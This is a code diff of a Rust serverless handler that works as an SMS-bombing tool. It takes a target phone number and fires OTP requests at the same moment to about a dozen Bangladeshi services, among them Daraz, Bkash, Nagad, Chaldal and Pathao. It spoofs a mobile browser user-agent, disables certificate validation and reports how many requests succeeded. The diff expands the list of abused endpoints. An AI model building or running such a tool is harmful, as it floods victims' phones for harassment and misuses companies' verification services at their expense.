@@ -1,16 +1,18 @@
 use vercel_runtime::{run, Body, Error, Request, Response, StatusCode};
 use reqwest::{Client, header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT}};
-use serde::{Deserialize, Serialize};
+use serde::Deserialize;
 use serde_json::{json, Value};
 use std::time::Duration;
 use futures::future::join_all;
 
+// ── SECRET TOKEN (frontend এর সাথে match করতে হবে) ──
+const SECRET_TOKEN: &str = "DCM_DARK_CYBER_2026";
 
-// 1. API Structure
+// ── API Structure ──
 struct SmsApi {
-    name: &'static str,
-    url: &'static str,
-    method: &'static str,
+    name:         &'static str,
+    url:          &'static str,
+    method:       &'static str,
     body_builder: fn(&str) -> Value,
 }
 
@@ -25,49 +27,88 @@ async fn main() -> Result<(), Error> {
 }
 
 pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
-    // --- 🛡️ API PROTECTION CONNECTION START ---
-    // JavaScript protection layer theke asha Auth Token check kora hochhe
-    let auth_token = req.headers().get("x-auth-token");
-    if auth_token.is_none() {
+
+    // ── CORS preflight ──
+    if req.method() == "OPTIONS" {
+        return Ok(Response::builder()
+            .status(StatusCode::OK)
+            .header("Access-Control-Allow-Origin",  "*")
+            .header("Access-Control-Allow-Methods", "POST, OPTIONS")
+            .header("Access-Control-Allow-Headers", "Content-Type, x-auth-token")
+            .body("".into())?);
+    }
+
+    // ── Auth check ──
+    let auth = req.headers()
+        .get("x-auth-token")
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("");
+
+    if auth != SECRET_TOKEN {
         return Ok(Response::builder()
             .status(StatusCode::UNAUTHORIZED)
-            .body(json!({"error": "Unauthorized", "message": "Security token missing!"}).to_string().into())?);
+            .header("Content-Type", "application/json")
+            .header("Access-Control-Allow-Origin", "*")
+            .body(json!({"error": "Unauthorized", "message": "Invalid security token!"})
+                .to_string().into())?);
     }
-    // --- 🛡️ API PROTECTION CONNECTION END ---
 
+    // ── Method check ──
     if req.method() != "POST" {
-        return Ok(Response::builder().status(StatusCode::METHOD_NOT_ALLOWED).body("POST Only".into())?);
+        return Ok(Response::builder()
+            .status(StatusCode::METHOD_NOT_ALLOWED)
+            .body("POST Only".into())?);
     }
 
+    // ── Parse body ──
     let body: BombRequest = match serde_json::from_slice(req.body()) {
-        Ok(val) => val,
-        Err(_) => return Ok(Response::builder().status(StatusCode::BAD_REQUEST).body("Invalid JSON".into())?),
+        Ok(v) => v,
+        Err(_) => return Ok(Response::builder()
+            .status(StatusCode::BAD_REQUEST)
+            .body("Invalid JSON".into())?),
     };
 
-    let target_number = body.number;
+    let target = body.number.clone();
+
+    // ── phone number helpers ──
+    let bd_no   = target.trim_start_matches('0').to_string();      // 1XXXXXXXXX
+    let bd_full = format!("880{}", bd_no);                          // 8801XXXXXXXXX
+    let plus_bd = format!("+88{}", target);                         // +8801XXXXXXXXX
+
+    // ── Build client ──
     let client = Client::builder()
-        .timeout(Duration::from_secs(9)) 
+        .timeout(Duration::from_secs(9))
+        .danger_accept_invalid_certs(true)
         .build()?;
 
-    // 2. API LIST (Add your 1000+ APIs here)
-    let apis = vec![
+    // ── API List ──
+    let apis: Vec<SmsApi> = vec![
         SmsApi {
             name: "Shadhin Music",
             url: "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
             method: "POST",
-            body_builder: |p| json!({"msisdn": format!("880{}", &p.replace("0", "")), "shortcode": 16235, "servicename": "Shadhin Music"}),
+            body_builder: |p| {
+                let n = p.trim_start_matches('0');
+                json!({"msisdn": format!("880{}", n), "shortcode": 16235, "servicename": "Shadhin Music"})
+            },
         },
         SmsApi {
             name: "Khaodao",
             url: "https://api.eat-z.com/auth/customer/app-connect",
             method: "POST",
-            body_builder: |p| json!({"username": format!("+88{}", &p.replace("0", ""))}),
+            body_builder: |p| {
+                let n = p.trim_start_matches('0');
+                json!({"username": format!("+88{}", n)})
+            },
         },
         SmsApi {
             name: "Walton Plaza",
             url: "https://waltonplaza.com.bd/api/auth/otp/create",
             method: "POST",
-            body_builder: |p| json!({"auth": {"countryCode": "880", "phone": p.replace("0", "")}, "captchaToken": "recapcha"}),
+            body_builder: |p| {
+                let n = p.trim_start_matches('0');
+                json!({"auth": {"countryCode": "880", "phone": n}, "captchaToken": "recapcha"})
+            },
         },
         SmsApi {
             name: "Easy.com.bd",
@@ -75,33 +116,125 @@ pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
             method: "POST",
             body_builder: |p| json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": p}),
         },
+        SmsApi {
+            name: "Chaldal",
+            url: "https://chaldal.com/api/OTP/GenerateOTP",
+            method: "POST",
+            body_builder: |p| json!({"phoneNumber": format!("+88{}", p)}),
+        },
+        SmsApi {
+            name: "Shajgoj",
+            url: "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
+            method: "POST",
+            body_builder: |p| json!({"phone": p, "type": "login"}),
+        },
+        SmsApi {
+            name: "Bkash",
+            url: "https://www.bkash.com/api/get-otp",
+            method: "POST",
+            body_builder: |p| json!({"mobile": p}),
+        },
+        SmsApi {
+            name: "Nagad",
+            url: "https://api.mynagad.com/api/dfs/check-account",
+            method: "POST",
+            body_builder: |p| {
+                let n = p.trim_start_matches('0');
+                json!({"accountNumber": format!("880{}", n)})
+            },
+        },
+        SmsApi {
+            name: "Pathao Food",
+            url: "https://pathao.com/api/v1/auth/otp",
+            method: "POST",
+            body_builder: |p| json!({"phone": p, "country_code": "+880"}),
+        },
+        SmsApi {
+            name: "Shohoz",
+            url: "https://shohoz.com/api/v4.0/user/sendOTP",
+            method: "POST",
+            body_builder: |p| json!({"mobile_no": p}),
+        },
+        SmsApi {
+            name: "Daraz",
+            url: "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
+            method: "POST",
+            body_builder: |p| {
+                let n = p.trim_start_matches('0');
+                json!({"mobile": format!("880{}", n), "countryCode": "880", "action": "REGISTER"})
+            },
+        },
+        SmsApi {
+            name: "Sheba.xyz",
+            url: "https://sheba.xyz/api/v2/auth/otp",
+            method: "POST",
+            body_builder: |p| json!({"mobile": p}),
+        },
     ];
 
+    // ── Fire all concurrently ──
     let mut tasks = vec![];
 
     for api in apis {
-        let client_ref = client.clone();
-        let number = target_number.clone();
+        let c      = client.clone();
+        let number = target.clone();
 
         let task = tokio::spawn(async move {
             let body_data = (api.body_builder)(&number);
-            let mut headers = HeaderMap::new();
-            headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
-            headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"));
+            let mut h = HeaderMap::new();
+            h.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
+            h.insert(USER_AGENT,   HeaderValue::from_static(
+                "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"
+            ));
+            h.insert("Accept",          HeaderValue::from_static("application/json, text/plain, */*"));
+            h.insert("Accept-Language", HeaderValue::from_static("en-US,en;q=0.9"));
 
-            if api.method == "POST" {
-                let _ = client_ref.post(api.url).headers(headers).json(&body_data).send().await;
+            let result = if api.method == "POST" {
+                c.post(api.url).headers(h).json(&body_data).send().await
             } else {
-                let _ = client_ref.get(api.url).headers(headers).send().await;
+                c.get(api.url).headers(h).send().await
+            };
+
+            match result {
+                Ok(r)  => (api.name, r.status().as_u16(), true),
+                Err(_) => (api.name, 0u16, false),
             }
         });
+
         tasks.push(task);
     }
 
-    join_all(tasks).await;
+    let results = join_all(tasks).await;
+
+    let mut success = 0u32;
+    let mut failed  = 0u32;
+    let mut api_results: Vec<Value> = vec![];
+
+    for r in results {
+        if let Ok((name, status, ok)) = r {
+            if ok && (status == 200 || status == 201 || status == 202) {
+                success += 1;
+            } else {
+                failed += 1;
+            }
+            api_results.push(json!({
+                "api":    name,
+                "status": status,
+                "ok":     ok && (status == 200 || status == 201 || status == 202)
+            }));
+        }
+    }
 
     Ok(Response::builder()
         .status(StatusCode::OK)
         .header("Content-Type", "application/json")
-        .body(json!({"status": "executed", "target": target_number}).to_string().into())?)
+        .header("Access-Control-Allow-Origin", "*")
+        .body(json!({
+            "status":   "executed",
+            "target":   target,
+            "success":  success,
+            "failed":   failed,
+            "total":    success + failed,
+            "results":  api_results
+        }).to_string().into())?)
 }
